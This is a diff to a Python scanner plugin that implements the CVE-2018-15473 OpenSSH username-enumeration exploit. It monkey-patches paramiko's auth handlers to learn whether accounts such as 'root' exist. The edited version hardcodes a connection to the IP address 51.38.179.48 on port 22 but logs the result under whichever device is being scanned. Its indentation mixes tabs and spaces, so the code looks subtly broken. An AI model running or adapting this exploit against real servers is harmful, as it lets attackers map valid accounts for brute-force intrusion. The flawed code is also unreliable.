@@ -12,9 +12,9 @@ https://www.exploit-db.com/exploits/45233
 https://github.com/Rhynorater/CVE-2018-15473-Exploit
 
 """
-
 import warnings
 import paramiko
+import socket
 import logging as log
 from .IPlugin import IPlugin, connection_type
 
@@ -31,39 +31,35 @@ def call_error(*args, **kwargs):
     raise BadUsername()
 
 def malform_packet(*args, **kwargs):
-	old_add_boolean = paramiko.message.Message.add_boolean
-	paramiko.message.Message.add_boolean = add_boolean
-	result  = old_parse_service_accept(*args, **kwargs)
-	paramiko.message.Message.add_boolean = old_add_boolean
-	return result
+    old_add_boolean = paramiko.message.Message.add_boolean
+    paramiko.message.Message.add_boolean = add_boolean
+    result  = old_parse_service_accept(*args, **kwargs)
+    paramiko.message.Message.add_boolean = old_add_boolean
+    return result
 
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
-
-def checkUsername(socket, username, tried=0):
-	transport = paramiko.transport.Transport(socket)
+def checkUsername(username, tried=0):
+	sock = socket.socket()
+	sock.connect(('51.38.179.48', 22))
+	transport = paramiko.transport.Transport(sock)
 	try:
-		transport.start_client()
-		a = transport.get_banner()
-		if a:
-			log.debug("BANNER=>", a)
+	    transport.start_client()
 	except paramiko.ssh_exception.SSHException:
-		log.debug("EXCEPTION no ", tried)
-		transport.close()
-		if tried < 3:
-			tried += 1
-			return checkUsername(socket, username, tried)
-		else:
-			log.debug ('[-] Failed to negotiate SSH transport')
-
+	    transport.close()
+	    if tried < 4:
+	    	tried += 1
+	    	return checkUsername(username, tried)
+	    else:
+	    	print ('[-] Failed to negotiate SSH transport')
 	try:
 		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
 	except BadUsername:
-			return (username, False)
+    		return (username, False)
 	except paramiko.ssh_exception.AuthenticationException:
-			return (username, True)
-	raise Exception("There was an error. Is this the correct version of OpenSSH?")	
-	pass
+    		return (username, True)
+	raise Exception("Error ??? CheckUsername")
+
+paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 
 class Plugin(IPlugin):
 	def __init__(self):
@@ -75,7 +71,6 @@ class Plugin(IPlugin):
 		pass
 
 	def exec(self, socket):
-		res = checkUsername(socket, "root")
-		if res:
-			log.debug("->",res)
+		res = checkUsername("root")
+		log.info("plugin=openssh-15473 device={} username={} valid={}".format(socket.getpeername()[0], res[0], res[1]))
 		pass
